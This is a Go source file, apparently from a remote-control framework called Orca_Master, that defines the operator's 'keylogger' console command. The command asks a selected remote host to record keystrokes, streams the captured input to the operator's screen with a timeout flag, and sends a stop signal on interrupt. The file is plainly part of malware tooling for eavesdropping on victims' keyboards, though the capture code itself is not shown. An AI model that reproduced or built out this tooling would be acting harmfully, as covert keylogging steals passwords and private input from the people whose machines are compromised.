package controller

import (
	"Orca_Master/cli/cmdopt/keyloggeropt"
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/retcode"
	"github.com/desertbit/grumble"
	"os"
	"os/signal"
	"time"
)

var keyloggerCmd = &grumble.Command{
	Name:  "keylogger",
	Help:  "get information entered by the remote host through the keyboard",
	Usage: "keylogger [-h | --help] [-t | timeout overtime_time]",
	Flags: func(f *grumble.Flags) {
		f.Int("t", "timeout", 5, "maximum time for a keylogger to eavesdrop (unit: minutes)")
	},
	Run: func(c *grumble.Context) error {
		if SelectId == -1 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
			return nil
		}
		timeout := c.Flags.Int("timeout")

		// 退出信号
		var sig os.Signal
		sigChan := make(chan os.Signal)
		signal.Notify(sigChan)

		// 发送键盘记录请求
		retData := keyloggeropt.SendKeyloggerRequestMsg(SelectClientId, common.ClientId, timeout)
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "screenshot request failed")
			return nil
		}
		colorcode.PrintMessage(colorcode.SIGN_NOTICE, colorcode.COLOR_SHINY+"keylogger is recording..."+colorcode.END)
		// 循环接收键盘记录
		for {
			select {
			case keyloggerData := <-common.KeyloggerDataChan:
				if keyloggerData == "Keylogger End" {
					colorcode.PrintMessage(colorcode.SIGN_NOTICE, keyloggerData)
					return nil
				}
				colorcode.PrintMessage(colorcode.SIGN_SUCCESS, keyloggerData)
			case sig = <-sigChan:
				if sig == os.Interrupt {
					keyloggeropt.SendKeyloggerQuit(SelectClientId, common.ClientId)
					colorcode.PrintMessage(colorcode.SIGN_NOTICE, "keylogger interrupt")
					time.Sleep(100 * time.Millisecond)
					return nil
				}
			}
		}
	},
}
